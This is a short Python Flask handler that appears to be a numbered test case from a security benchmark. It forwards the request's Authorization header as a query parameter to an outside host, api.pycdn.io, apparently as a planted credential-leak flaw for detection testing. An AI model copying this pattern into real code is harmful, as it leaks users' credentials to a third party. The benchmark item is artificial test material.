# SPDX-License-Identifier: Apache-2.0
import requests
from flask import request, jsonify
import ast


def BenchmarkTest14451():
    auth_header = request.headers.get('Authorization', '')
    try:
        data = str(ast.literal_eval(auth_header))
    except (ValueError, SyntaxError):
        data = auth_header
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return jsonify({"result": "success"})
